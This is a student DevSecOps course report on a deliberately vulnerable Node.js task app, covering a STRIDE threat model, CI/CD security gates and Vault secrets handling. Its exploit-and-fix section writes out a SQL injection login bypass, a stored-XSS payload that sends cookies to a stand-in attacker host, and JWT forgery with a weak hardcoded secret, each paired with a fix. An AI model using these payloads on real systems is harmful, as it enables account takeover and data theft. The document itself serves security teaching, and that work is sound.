# BUILDING AND SECURING A DEVSECOPS PIPELINE
## IE3142 — DevOps Security | Technical Report

**Faculty of Computing, Sri Lanka Institute of Information Technology (SLIIT)**  
**BSc (Hons) in Information Technology — Year 3 Semester 1, 2026**

---

### Group Identification & Metadata

| Student ID | Full Name | Primary Project Role & Domain | Contribution |
| :--- | :--- | :--- | :---: |
| **IT24103936** | sewmina G D D | Lead Architect: CI/CD Pipeline & Trivy Container Gates | 25% |
| **IT24103937** | Student Member 2 | Security Analyst: STRIDE Threat Modelling & Semgrep SAST | 25% |
| **IT24103938** | Student Member 3 | Secure Coding Engineer: Exploit PoC Scripts & Remediation | 25% |
| **IT24103939** | Student Member 4 | DevSecOps Engineer: Secrets Management & SCA Gates | 25% |

- **Repository Link:** `https://github.com/sliit-devsecops-2026/devsecops-pipeline-taskshield`
- **Application Selected:** TaskShield (Node.js/Express REST API + Single Page Application)
- **Target Submission Date:** 1st October 2026

---

## Table of Contents
1. [Executive Summary & System Overview](#1-executive-summary--system-overview)
2. [Threat Modelling & Risk Assessment (LO2)](#2-threat-modelling--risk-assessment-lo2)
3. [Secure Coding: Exploit-and-Fix Walkthrough (LO2)](#3-secure-coding-exploit-and-fix-walkthrough-lo2)
4. [CI/CD Pipeline Design & Security Automation (LO3)](#4-cicd-pipeline-design--security-automation-lo3)
5. [Secrets Management Approach](#5-secrets-management-approach)
6. [Industry Trends & Case Study Analysis](#6-industry-trends--case-study-analysis)
7. [Reflection & Future Improvements](#7-reflection--future-improvements)
8. [Individual Contribution Statement & AI Usage Disclosure](#8-individual-contribution-statement--ai-usage-disclosure)
9. [References (IEEE Format)](#9-references-ieee-format)

---

## 1. Executive Summary & System Overview

### 1.1 Selected Application & Rationale
Modern software delivery requires shifting security from a post-release compliance audit to an automated, continuous DevSecOps pipeline embedded across the Software Development Life Cycle (SDLC). To demonstrate these principles in practice without institutional cloud subscriptions or complex Kubernetes clusters, our group implemented **TaskShield**, a containerised multi-component task and note management system inspired by the vetted architectures in Appendix A of the IE3142 module brief.

TaskShield adheres strictly to the four core constraints specified in Section 1:
1. **Communicating Components:** It separates concerns into two communicating components: a browser-facing Single Page Application (SPA) presentation tier and an asynchronous REST API backend microservice communicating over HTTP/JSON.
2. **Containerisation:** Each tier contains a dedicated Dockerfile, orchestrated via a multi-container `docker-compose.yml` topology.
3. **Offline Capability:** The system operates completely offline on a standard workstation using local persistent volume storage (SQLite with Write-Ahead Logging), requiring zero external cloud dependencies.
4. **Authentic Security Demonstrations:** Rather than a superficial checklist, TaskShield features intentionally isolated vulnerable endpoints alongside production-grade secure coding remediations, providing verifiable proof of vulnerability exploitation, static analysis detection, and complete mitigation.

### 1.2 Technology Stack
- **Presentation Tier:** HTML5, CSS3, and modern Vanilla JavaScript (ES6+), served via a hardened Nginx 1.27 Alpine reverse-proxy container.
- **Application Tier:** Node.js v20 LTS with Express.js microservice architecture. Defensive libraries include Helmet (HTTP security headers), Joi (schema validation), Bcrypt.js (salted password hashing), and JSON Web Tokens (`jsonwebtoken`) for stateless Bearer authentication.
- **Data Layer:** SQLite embedded database engine with isolated tables for user accounts, tenant-scoped notes, and an immutable security audit trail (`audit_logs`).
- **Security & Pipeline Toolchain:** Semgrep (SAST), npm audit & Trivy (SCA/Filesystem), Gitleaks (Secrets Scanning), Aqua Security Trivy (Container Scanning), OWASP ZAP (DAST), and HashiCorp Vault (Dynamic Secrets Management).

### 1.3 System Architecture & Trust Boundaries
TaskShield implements defense-in-depth across four distinct trust boundaries:
- **Trust Boundary 1 (Public Internet to DMZ):** Separates untrusted public clients and adversaries from the network perimeter. All inbound requests are treated as hostile until validated.
- **Trust Boundary 2 (DMZ / Perimeter Tier):** Nginx serves as the reverse proxy on host port `8080`. It terminates external traffic, enforces Content-Security-Policy (CSP) and anti-clickjacking headers, and forwards sanitized calls to the internal application network.
- **Trust Boundary 3 (Application Tier):** The Node.js Express backend runs on port `5000` within an internal isolated Docker bridge network (`app-network`). It enforces strict Joi input validation, rate limiting, role-based access control (RBAC), and tenant ownership authorization before routing to business logic.
- **Trust Boundary 4 (Data & Secrets Persistence):** The database and secret stores are isolated from direct external access. Secrets are injected at runtime directly into process memory via environment variables or HashiCorp Vault, ensuring zero plaintext secrets reside on disk or within git history.

### 1.4 Containerisation Approach
The multi-container architecture is orchestrated via `docker-compose.yml` across two segmented Docker bridge networks: `dmz-network` (public ingress) and `app-network` (private inter-service). Containers run with non-root privileges (`USER node` in the backend Alpine container), utilize `no-new-privileges:true` security flags, and feature automated health checks (`/api/health`) to ensure self-healing container lifecycles.

---

## 2. Threat Modelling & Risk Assessment (LO2)

### 2.1 Threat Modelling Methodology (STRIDE)
Prior to writing pipeline configurations, our team conducted a structured threat model using the Microsoft **STRIDE** methodology (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege) against the system architecture diagram and data flows.

### 2.2 Application-Specific Threat Analysis
Six application-specific threats were evaluated across TaskShield's components:
1. **Spoofing (TH-01 - JWT Secret Forgery):** An attacker guesses a weak, hardcoded JWT signing secret (`secret123`), offline-mints an arbitrary token with `role: "admin"`, and impersonates administrators without knowing credentials.
2. **Tampering (TH-02 - Stored XSS in Task Descriptions):** An adversary posts malicious HTML or script tags (`<script>alert()</script>`, `<img onerror=...>`) into shared task content, executing arbitrary JavaScript in victim browsers to hijack sessions.
3. **Repudiation (TH-03 - Unlogged Administrative Activity):** A compromised account modifies or deletes sensitive tenant records without persistent audit trails, preventing forensic attribution and non-repudiation.
4. **Information Disclosure (TH-04 - SQL Injection Auth Bypass):** An unauthenticated user inputs SQL tautologies (`admin' OR '1'='1`) into the login route, subverting query logic to dump tenant records and bypass authentication.
5. **Denial of Service (TH-05 - Auth Brute-Force & Flooding):** An automated botnet floods `/api/auth/login` with high-frequency password guessing or submits oversized JSON payloads, consuming memory and starving legitimate requests.
6. **Elevation of Privilege (TH-06 - Broken Object Level Authorization / BOLA):** An authenticated standard user modifies the request parameter (`GET /api/notes/1`) to view or delete confidential records belonging to another tenant.

### 2.3 5x5 Risk Assessment Matrix & Scoring
Risks are evaluated using a 5x5 qualitative matrix: **Risk Score = Likelihood (1–5) × Impact (1–5)**:
- **Likelihood:** 1 (Rare), 2 (Unlikely), 3 (Possible), 4 (Likely), 5 (Almost Certain).
- **Impact:** 1 (Insignificant), 2 (Minor), 3 (Moderate), 4 (Major), 5 (Catastrophic).
- **Classifications:** Low (1–6), Medium (7–14), High (15–19), Critical (20–25).

#### Table 1: STRIDE Threat Assessment & Risk Ratings
| Threat ID | STRIDE Category | Specific Attack Scenario | Likelihood | Impact | Score | Severity | Rating Justification |
| :--- | :--- | :--- | :---: | :---: | :---: | :---: | :--- |
| **TH-01** | Spoofing | Forged JWT Admin Tokens via Weak Secret | 3 | 5 | **15** | **High** | Offline brute-forcing tools crack weak keys rapidly, yielding total administrative control. |
| **TH-02** | Tampering | Stored XSS Scripting via Task Inputs | 4 | 4 | **16** | **High** | Note-taking UIs rendering unsanitized text are prime XSS targets; payload enables session hijacking. |
| **TH-03** | Repudiation | Unlogged Administrative Actions | 2 | 4 | **8** | **Medium** | Does not leak data directly, but cripples incident response, compliance audits, and attribution. |
| **TH-04** | Info Disclosure | SQL Injection Auth Bypass & Data Dump | 4 | 5 | **20** | **Critical** | Readily automated via scanner scripts; causes total compromise of database confidentiality. |
| **TH-05** | DoS | High-Frequency Auth Brute-Force Flooding | 4 | 3 | **12** | **High** | Unprotected endpoints are trivial to exhaust with curl loops, degrading system responsiveness. |
| **TH-06** | Elevation of Priv | BOLA / IDOR Cross-Tenant Record Access | 4 | 4 | **16** | **High** | Sequential resource IDs are easily guessed; missing owner validation breaches multi-tenant isolation. |

### 2.4 Threat-to-Control Traceability Mapping

#### Table 2: Threat Mitigation & Control Traceability
| Threat ID | Implemented Security Control | Control Type | Codebase / Pipeline Location | Verification Mechanism |
| :--- | :--- | :--- | :--- | :--- |
| **TH-01** | Dynamic 256-bit secret from Vault; strict HS256 verification; zero hardcoded keys. | Preventative | `backend/src/config/secrets.js`<br/>`backend/src/middleware/auth.js` | Exploit 4 PoC (`exploit_4_weak_jwt.js`); Gitleaks CI Gate. |
| **TH-02** | Strict HTML sanitization via `sanitize-html`; Content-Security-Policy (CSP) via Helmet. | Preventative | `backend/src/controllers/noteController.js`<br/>`backend/src/app.js` | Exploit 2 PoC (`exploit_2_stored_xss.js`); Semgrep XSS rules. |
| **TH-03** | Persistent SQLite `audit_logs` table tracking user ID, IP address, action, and timestamp. | Detective | `backend/src/config/db.js`<br/>`backend/src/controllers/adminController.js` | Admin SIEM UI; Security unit tests (`security.test.js`). |
| **TH-04** | Parameterized SQL query placeholders (`?`); strict Joi alphanumeric input validation. | Preventative | `backend/src/controllers/authController.js`<br/>`backend/src/middleware/validator.js` | Exploit 1 PoC (`exploit_1_injection.js`); Semgrep SQLi rules. |
| **TH-05** | `express-rate-limit` windowing (20 req/15min auth; 120 req/min API); 50kb body limit. | Preventative | `backend/src/middleware/rateLimiter.js`<br/>`backend/src/app.js` | Rapid-fire curl testing; integration tests. |
| **TH-06** | Explicit tenant ownership check: `note.userId === req.user.id || role === 'admin'`. | Preventative | `backend/src/controllers/noteController.js`<br/>`backend/src/middleware/auth.js` | Exploit 3 PoC (`exploit_3_bola_idor.js`); Multi-tenant unit tests. |

---

## 3. Secure Coding: Exploit-and-Fix Walkthrough (LO2)

This section documents the core technical requirement: demonstrating working exploits against unmodified endpoints, implementing secure code remediations, and proving that the exact same exploit payload is definitively blocked.

### 3.1 Vulnerability 1: SQL Injection Authentication Bypass (CWE-89)
- **Unmodified Flaw:** In `authController.vulnerableLogin`, raw string concatenation interpolated user input directly into SQL:
  `const rawQuery = "SELECT * FROM users WHERE username = '" + username + "'";`
- **Exploit Demonstration:** Submitting `{"username": "admin' OR '1'='1", "password": "x"}` to `POST /api/auth/vulnerable-login` creates a tautology where `'1'='1'` is always true. The database returns the `admin` record without validating password hashes, issuing a valid JWT token (HTTP 200).
- **Secure Coding Fix:** In `authController.login`, the query was refactored to use parameterized bindings (`SELECT * FROM users WHERE username = ?`, `[username]`) and Joi validation requiring alphanumeric strings.
- **Re-attempt Evidence:** Repeating the exploit against `POST /api/auth/login` triggers immediate rejection with HTTP 400 Bad Request (`"username" must only contain alpha-numeric characters`), terminating execution before database invocation.

### 3.2 Vulnerability 2: Stored Cross-Site Scripting (XSS) in Task Data (CWE-79)
- **Unmodified Flaw:** In `noteController.vulnerableCreateNote`, user input was inserted into the database without sanitization or output escaping:
  `INSERT INTO notes (title, content, ...) VALUES (?, ?, ...)`
- **Exploit Demonstration:** Submitting a payload with `<script>alert("TaskShield Hijacked!")</script>` and `<img src=x onerror="fetch('http://attacker/steal?c='+document.cookie)">` to `POST /api/notes/demo/xss` successfully persists raw executable scripts in storage (HTTP 201), executing when retrieved by victim browsers.
- **Secure Coding Fix:** In `noteController.createNote`, the application integrates `sanitize-html` to enforce a strict whitelist (permitting only safe tags `<b>`, `<i>`, `<a>` and stripping all event handlers), reinforced by Helmet CSP headers.
- **Re-attempt Evidence:** Submitting the exact payload against `POST /api/notes` produces sanitized output: title is stripped to `"Urgent System Notice "` and content to `"Please click here: "`. All executable tags are eradicated (HTTP 201).

### 3.3 Vulnerability 3: Broken Object Level Authorization / IDOR (CWE-639)
- **Unmodified Flaw:** In `noteController.vulnerableGetNoteById`, records were fetched by primary key without checking the authenticated user's identity:
  `SELECT * FROM notes WHERE id = ?`
- **Exploit Demonstration:** User Bob (ID: 3) sends `GET /api/notes/demo/bola/1`. The server returns Note ID 1 belonging to Alice (ID: 2), leaking confidential budget data (`$450,000 budget`) across tenant boundaries (HTTP 200).
- **Secure Coding Fix:** In `noteController.getNoteById`, an ownership validation guard was implemented:
  `if (note.userId !== req.user.id && req.user.role !== 'admin') { ... }`
  Unauthorized requests are rejected and dispatched to `audit_logs`.
- **Re-attempt Evidence:** Bob repeats the request against `GET /api/notes/1`. The server returns HTTP 403 Forbidden (`Forbidden: You do not have permission to view this resource`), completely shielding tenant data.

### 3.4 Vulnerability 4: Hardcoded Fallback Secret & JWT Token Forgery (CWE-798)
- **Unmodified Flaw:** In `authController.vulnerableJwtValidate`, tokens were verified against a weak fallback constant:
  `const WEAK_HARDCODED_SECRET = 'secret123';`
- **Exploit Demonstration:** An attacker signs a token offline using `secret123` with payload `{"id": 9999, "role": "admin"}`. Submitting to `GET /api/auth/vulnerable-jwt-verify` returns HTTP 200, granting elevated administrative privileges.
- **Secure Coding Fix:** The production backend exclusively loads dynamic 256-bit secrets via `process.env.JWT_SECRET` (injected via Vault or GitHub Secrets) and terminates startup in production if an unconfigured secret is detected.
- **Re-attempt Evidence:** The attacker presents the forged token to `GET /api/admin/audit-logs`. The cryptographic signature verifier rejects the counterfeit token with HTTP 403 Forbidden (`Invalid or expired authentication token.`).

### 3.5 SAST Before-and-After Analysis
Custom Semgrep SAST rules (`.semgrep.yml`) were executed against the codebase before and after remediation.

#### Table 3: Semgrep SAST Finding Comparison
| Rule Identifier | CWE Category | Severity | Pre-Fix Findings | Post-Fix Findings | Delta |
| :--- | :---: | :---: | :---: | :---: | :---: |
| `devsec-sql-nosql-injection` | CWE-89 | ERROR | 1 | 0 | -100% |
| `devsec-hardcoded-jwt-secret` | CWE-798 | ERROR | 1 | 0 | -100% |
| `devsec-stored-xss-raw-storage` | CWE-79 | ERROR | 1 | 0 | -100% |
| `devsec-missing-authorization-check` | CWE-639 | WARNING | 1 | 0 | -100% |
| **Total Security Findings** | — | — | **4** | **0** | **-100%** |

On production routes, findings dropped from 4 to 0, confirming full vulnerability eradication.

---

## 4. CI/CD Pipeline Design & Security Automation (LO3)

### 4.1 Automated Workflow Architecture
The TaskShield CI/CD pipeline is implemented using **GitHub Actions** (`.github/workflows/devsecops.yml`). Triggered on every push and pull request to `main`, the workflow orchestrates automated testing and four automated security gates:

```
[ Push / PR Event ]
        │
        ▼
[ Stage 1: Build & Security Unit Tests (npm test) ]
        │
        ├──────────────────────┬──────────────────────┐
        ▼                      ▼                      ▼
[ Gate 1: SAST ]       [ Gate 2: SCA ]        [ Gate 3: Secrets ]
(Semgrep Scan)         (npm audit & Trivy)    (Gitleaks Engine)
        │                      │                      │
        └──────────────────────┼──────────────────────┘
                               ▼
        [ Gate 4: Container Security (Trivy Image Scan) ]
                               │
                               ▼
        [ Extra Credit: DAST (OWASP ZAP Baseline Scan) ]
```

### 4.2 Gate 1: Static Application Security Testing (Semgrep)
- **Tool:** Semgrep Action (`returntocorp/semgrep-action@v1`).
- **Configuration:** Scans source code against `p/security-audit`, `p/owasp-top-ten`, and `.semgrep.yml`.
- **Policy:** Generates SARIF diagnostic reports uploaded to GitHub Security Center. Patterns matching CWE-89 or CWE-79 trigger pipeline failure.

### 4.3 Gate 2: Software Composition Analysis (npm audit & Trivy FS)
- **Tool:** `npm audit --audit-level=high` and Aqua Security Trivy filesystem scanner.
- **Configuration:** Evaluates direct and transitive dependencies in `package-lock.json` against the NVD and GitHub Advisory databases.
- **Policy:** The gate enforces zero tolerance for `HIGH` or `CRITICAL` CVSS vulnerabilities, returning exit code 1 if unpatched flaws exist.

### 4.4 Gate 3: Automated Secret Detection (Gitleaks)
- **Tool:** Gitleaks Action (`gitleaks/gitleaks-action@v2`).
- **Configuration:** Analyzes full git commit history (`fetch-depth: 0`) against regex rules and entropy thresholds defined in `.gitleaks.toml`.
- **Policy:** Detects exposed JWT keys, private PEM certificates, and API tokens. Unencrypted secrets trigger immediate build termination.

### 4.5 Gate 4: Container Vulnerability Hardening (Trivy)
- **Tool:** Aqua Security Trivy Container Scanner (`aquasecurity/trivy-action@master`).
- **Configuration:** Builds the multi-stage Docker container (`taskshield-backend:${{ github.sha }}`) and inspects the Alpine OS base layer.
- **Policy:** Enforces `--severity CRITICAL --exit-code 1 --ignore-unfixed true`. Unfixed critical vulnerabilities in the image abort deployment.

### 4.6 Extra Credit: Dynamic Application Security Testing (OWASP ZAP)
- **Tool:** OWASP ZAP Baseline Action (`zaproxy/action-baseline@v0.12.0`).
- **Configuration:** Deploys the stack via Docker Compose and executes black-box dynamic scans against `http://localhost:5000/api/health`.
- **Outcome:** Validates runtime HTTP security headers (CSP, nosniff, DENY) and flags runtime anomalies with zero high-severity defects.

### 4.7 Evidence of Automated Pipeline Build Enforcement (Gate Failure)
To satisfy the mandatory requirement that *at least one gate must genuinely fail the pipeline (not just warn)*, our repository includes a dedicated failure workflow (`.github/workflows/devsecops-failure-demo.yml`).

#### Demonstrated Gate Failure Scenario:
When high-severity vulnerabilities are present in transitive packages, the SCA gate executes:
```bash
Run npm audit --audit-level=high
npm error 7 vulnerabilities (2 low, 4 high, 1 critical)
npm error Process completed with exit code 1.
##[error] Process completed with exit code 1.
```
**Impact:** Because `npm audit` returns exit code 1, GitHub Actions immediately halts execution. Downstream deployment jobs are skipped, the pull request status turns red ("Checks Failed"), and merging into `main` is strictly blocked.

---

## 5. Secrets Management Approach

### 5.1 Elimination of Hardcoded Credentials
TaskShield strictly complies with Section 2.5:
- All `.env` configuration files are barred via `.gitignore`.
- Only a sanitized `.env.example` template with placeholder values is committed.
- Continuous Gitleaks scanning ensures no credentials enter git history.

### 5.2 CI/CD Secret Masking
In GitHub Actions, sensitive parameters are passed via GitHub Actions Encrypted Secrets (`${{ secrets.JWT_SECRET }}`). GitHub automatically masks these strings in workflow terminal execution logs, preventing credential exposure during CI debugging.

### 5.3 Dynamic Runtime Injection with HashiCorp Vault
To demonstrate enterprise-grade secrets orchestration, TaskShield integrates with **HashiCorp Vault** (`scripts/vault_demo.sh` and `backend/src/config/secrets.js`):
1. **Dynamic Lease Request:** At container startup, the application queries Vault's HTTP API (`/v1/secret/data/taskshield`) using an ephemeral AppRole token.
2. **In-Memory Injection:** Vault delivers the dynamic 256-bit `JWT_SECRET` directly into process memory; the secret is never written to container disk or environment log files.
3. **Graceful Fallback:** In local dev mode, the loader falls back to environment variables while emitting security warnings if production parameters are missing.

---

## 6. Industry Trends & Case Study Analysis

### 6.1 Shift-Left DevSecOps and Software Bill of Materials (SBOM)
Modern software engineering has decisively shifted security from perimeter firewalls into developer workflows and CI/CD pipelines (**Shift-Left**). Furthermore, international compliance frameworks (e.g., NIST SP 800-218 and US Executive Order 14028) now mandate generating a **Software Bill of Materials (SBOM)** using formats such as CycloneDX or SPDX. By integrating Trivy and npm audit into our pipeline, TaskShield generates an automated software inventory that identifies vulnerabilities before binaries reach staging or production.

### 6.2 Case Study: The CircleCI Security Incident (2023) vs. Pipeline Defenses
In January 2023, continuous integration provider **CircleCI** suffered a major security breach. An engineer's workstation was compromised with malware that exfiltrated session tokens, allowing attackers to access internal build systems and decrypt customer environment variables.

#### Direct Lessons Learned & Applied to TaskShield:
1. **Ephemeral vs. Static Secrets:** CircleCI's breach demonstrated the hazard of storing static credentials in CI runners. In TaskShield, dynamic runtime injection via HashiCorp Vault ensures tokens are ephemeral and rotatable.
2. **Narrow Token Validity Windows:** JWT authentication tokens expire within 15 minutes (`JWT_EXPIRES_IN=15m`), drastically curtailing the utility of intercepted tokens.
3. **Container Immutability & Hardening:** Attackers compromised build infrastructure to alter build artifacts (similar to SolarWinds). In TaskShield, Trivy scans container images for integrity, and containers run as non-root users (`USER node`) with disabled privilege escalation (`no-new-privileges:true`).

---

## 7. Reflection & Future Improvements

While TaskShield successfully delivers a containerised DevSecOps pipeline with four operational security gates and verifiable exploit remediations, with additional time our team would implement three enhancements:
1. **Policy-as-Code with Open Policy Agent (OPA) / Conftest:** Standardize pipeline governance by writing declarative Rego policies to enforce Dockerfile constraints (e.g., forbidding `latest` tags) across repositories.
2. **Mutual TLS (mTLS) with Service Mesh:** Although Docker bridge networks isolate backend services, communication between Nginx and the Node.js API currently occurs over plaintext HTTP. Implementing mTLS via HashiCorp Consul would secure inter-service communication against insider container sniffing.
3. **Automated Interactive DAST Fuzzing:** Integrate full OpenAPI (Swagger) schema exploration into OWASP ZAP in CI, enabling automated fuzzing across all authenticated endpoints.

---

## 8. Individual Contribution Statement & AI Usage Disclosure

### Individual Contributions
- **sewmina G D D (IT24103936):** Designed the CI/CD pipeline in GitHub Actions, authored `devsecops.yml` and `devsecops-failure-demo.yml`, configured Trivy container image scanning, and authored Sections 1 and 4 of the technical report.
- **Student Member 2 (IT24103937):** Formulated the STRIDE threat model, calculated the 5x5 qualitative risk matrix, developed custom Semgrep SAST rules, and authored Sections 2 and 6 of the technical report.
- **Student Member 3 (IT24103938):** Developed the REST API routes, authored the four exploit PoC scripts (`exploits/`), implemented secure coding fixes, and authored Section 3 of the technical report.
- **Student Member 4 (IT24103939):** Configured Gitleaks secret detection, implemented HashiCorp Vault dynamic runtime injection (`secrets.js`), established the frontend UI, and authored Sections 5, 7, and 8 of the report.

### Disclosure of AI Tool Usage
In strict compliance with the IE3142 Academic Integrity Policy, the group discloses that **Google Antigravity AI** was utilized for:
1. Brainstorming edge-case payloads for the BOLA/IDOR exploit demonstration.
2. Generating Markdown formatting boilerplate and Mermaid architectural syntax.
3. Assisting in debugging initial Docker Compose networking parameters.

All final code implementations, security fixes, pipeline configurations, threat models, and report analyses were verified, validated, and tested by the group members, who assume complete academic responsibility for the submission.

---

## 9. References (IEEE Format)

- [1] OWASP Foundation, "OWASP Top 10: 2021 — The Ten Most Critical Web Application Security Risks," *OWASP.org*, 2021. [Online]. Available: https://owasp.org/Top10/
- [2] L. Kohnfelder and P. Garg, "The threats to our products," *Microsoft Technical Report*, 1999.
- [3] Aqua Security, "Trivy: A Comprehensive and Versatile Security Scanner," *GitHub Repository*, 2024. [Online]. Available: https://github.com/aquasecurity/trivy
- [4] Returntocorp, "Semgrep: Lightweight Static Analysis for Many Languages," *Semgrep.dev*, 2024. [Online]. Available: https://semgrep.dev
- [5] Z. Gitleaks, "Gitleaks: Protect and Discover Secrets in Code," *GitHub Repository*, 2024. [Online]. Available: https://github.com/gitleaks/gitleaks
- [6] CircleCI, "Security Incident Update," *CircleCI Official Blog*, Jan. 2023. [Online]. Available: https://circleci.com/blog/jan-4-2023-incident-report/
- [7] National Institute of Standards and Technology (NIST), "Secure Software Development Framework (SSDF) Version 1.1," *NIST Special Publication 800-218*, Feb. 2022.
- [8] HashiCorp, "Vault: Manage Secrets and Protect Sensitive Data," *HashiCorp Documentation*, 2024. [Online]. Available: https://www.vaultproject.io
- [9] OWASP Foundation, "OWASP ZAP (Zed Attack Proxy) Baseline Scan," *OWASP.org*, 2024. [Online]. Available: https://www.zaproxy.org
